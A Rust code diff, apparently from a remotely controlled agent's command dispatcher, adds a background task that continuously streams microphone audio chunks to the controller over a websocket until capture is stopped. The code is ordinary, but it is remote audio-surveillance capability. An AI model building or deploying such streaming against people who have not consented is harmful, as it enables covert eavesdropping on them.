@@ -415,6 +415,19 @@ pub(crate) async fn dispatch(
             let idx = data_u64(&data, "deviceIndex", 0) as u32;
             let r = libra_modules::execution::MicCapture::start_capture(idx);
             ws_send(tx, &agent_id, "mic.data", &r, rid).await;
+
+            // 持续流式发送 1 秒 PCM 块，直到 stop_capture 置位。
+            let stream_tx = tx.clone();
+            let stream_agent = agent_id.clone();
+            tokio::spawn(async move {
+                while libra_modules::execution::MicCapture::is_active() {
+                    let chunk = libra_modules::execution::MicCapture::capture_chunk();
+                    if !chunk.is_empty() {
+                        ws_send(&stream_tx, &stream_agent, "mic.data", &chunk, None).await;
+                    }
+                    tokio::time::sleep(std::time::Duration::from_millis(300)).await;
+                }
+            });
         }
         ws_type::MIC_UNBIND => {
             let r = libra_modules::execution::MicCapture::stop_capture();
